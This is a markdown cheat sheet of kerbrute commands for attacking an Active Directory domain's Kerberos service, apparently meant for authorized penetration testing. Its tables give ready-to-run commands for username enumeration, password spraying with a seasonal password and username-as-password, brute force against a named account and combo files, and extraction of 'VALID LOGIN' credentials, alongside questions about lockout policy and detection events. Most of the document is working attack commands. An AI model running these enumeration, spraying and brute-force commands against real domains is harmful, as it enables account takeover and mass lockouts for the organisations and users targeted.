# kerbrute — command scenarios for deep research

Installed build: kerbrute dev snapshot (11/09/26). Flags come from `help.txt`
and each subcommand's `--help`.

## How to invoke

```text
@deep-research For kerbrute against a modern AD domain with a 5-attempt lockout
policy, what thread/delay/safe settings keep enumeration reliable, how do
KDC error codes differ across Windows Server 2016-2025, and which detections
(4768/4771) are unavoidable? Cite kerbrute docs, MS-KILE, and detection
engineering writeups; return a safe engagement sequence.
```

---

## Scenario 1 — username enumeration

| # | Command | How to use |
|---|---------|------------|
| 1 | `kerbrute userenum -d contoso.com --dc 10.10.0.10 users.txt` | Standard enumeration |
| 2 | `kerbrute userenum -d contoso.com --dc 10.10.0.10 -o enum.log users.txt` | Save evidence |
| 3 | `kerbrute userenum -d contoso.com --dc 10.10.0.10 -v users.txt` | Show failures too |
| 4 | `kerbrute userenum -d contoso.com --dc 10.10.0.10 -t 3 --delay 1000 users.txt` | Slow and quiet |
| 5 | `kerbrute userenum -d contoso.com --dc 10.10.0.10 --safe users.txt` | Abort on lockout |

**Research questions**
- Which KDC error strings indicate existence on current Server versions?
- Does `--delay` disable threading entirely as documented?

**Sources:** kerbrute docs, MS-KILE, DC event logs.
**Output:** a validated username list.

---

## Scenario 2 — password spraying

| # | Command | How to use |
|---|---------|------------|
| 6 | `kerbrute passwordspray -d contoso.com --dc 10.10.0.10 users.txt 'Spring2026!'` | One password |
| 7 | `kerbrute passwordspray -d contoso.com --dc 10.10.0.10 --safe users.txt 'Spring2026!'` | Lockout-aware |
| 8 | `kerbrute passwordspray -d contoso.com --dc 10.10.0.10 --delay 2000 users.txt 'Spring2026!'` | Slow spray |
| 9 | `kerbrute passwordspray -d contoso.com --dc 10.10.0.10 --user-as-pass users.txt` | Username-as-password |
| 10 | `kerbrute passwordspray ... -o spray.log users.txt 'Spring2026!'` | Evidence log |

**Research questions**
- What lockout threshold and observation window does the target policy use?
- Does a successful TGT request leave a different event than a failure?

**Sources:** domain policy, DC audit logs, kerbrute issues.
**Output:** a list of valid credential pairs.

---

## Scenario 3 — targeted brute force

| # | Command | How to use |
|---|---------|------------|
| 11 | `kerbrute bruteuser -d contoso.com --dc 10.10.0.10 passwords.txt alice` | One account |
| 12 | `kerbrute bruteuser -d contoso.com --dc 10.10.0.10 --delay 1000 passwords.txt alice` | Paced attempts |
| 13 | `kerbrute bruteuser -d contoso.com --dc 10.10.0.10 --safe passwords.txt alice` | Stop on lockout |
| 14 | `kerbrute bruteforce -d contoso.com --dc 10.10.0.10 combos.txt` | Combo file |
| 15 | `cat combos.txt \| kerbrute bruteforce -d contoso.com --dc 10.10.0.10 -` | stdin |

**Research questions**
- Is brute force ever acceptable under a lockout policy, and with what guardrails?
- How does `bruteforce` order attempts from a file?

**Sources:** engagement RoE, kerbrute source, DC logs.
**Output:** a recovered password or a documented stop.

---

## Scenario 4 — connectivity and domain discovery

| # | Command | How to use |
|---|---------|------------|
| 16 | `nslookup -type=SRV _kerberos._tcp.contoso.com` | Confirm KDC SRV records |
| 17 | `kerbrute userenum -d contoso.com users.txt` | DNS-based DC discovery |
| 18 | `kerbrute userenum -d CONTOSO.COM --dc dc01.contoso.com users.txt` | FQDN DC target |
| 19 | `ntpdate -q dc01.contoso.com` | Check clock skew |
| 20 | `nc -vz 10.10.0.10 88` | Confirm port 88 reachability |

**Research questions**
- When does SRV discovery pick a DC in the wrong site?
- How much clock skew is tolerated before pre-auth fails?

**Sources:** DNS SRV records, Kerberos RFC, DC logs.
**Output:** a verified path to the correct KDC.

---

## Scenario 5 — evidence and handoff

| # | Command | How to use |
|---|---------|------------|
| 21 | `kerbrute userenum ... -o users-valid.log users.txt` | Persist results |
| 22 | `grep 'VALID USERNAME' users-valid.log \| awk '{print $NF}' > valid.txt` | Extract names |
| 23 | `grep 'VALID LOGIN' spray.log` | Extract credentials |
| 24 | `kerbrute version` | Record tool version |
| 25 | `sha256sum users-valid.log spray.log` | Hash evidence |

**Research questions**
- What log format does `-o` use, and is it append or overwrite?
- What evidence retention applies to credential material?

**Sources:** kerbrute source, engagement policy.
**Output:** a hashed evidence bundle and a clean handoff list.

## Flag coverage checklist

| Help group | Flags | Scenario |
|------------|-------|----------|
| Global | `--dc --delay -d -h -o --safe -t -v` | 1–5 |
| userenum | wordlist argument | 1, 4 |
| passwordspray | `--user-as-pass`, userlist, password | 2 |
| bruteuser | password list, username | 3 |
| bruteforce | combo file or stdin | 3 |

## Scenario index

| Scenario | Commands |
|----------|----------|
| 1 — enumeration | 5 |
| 2 — spraying | 5 |
| 3 — brute force | 5 |
| 4 — connectivity | 5 |
| 5 — evidence | 5 |
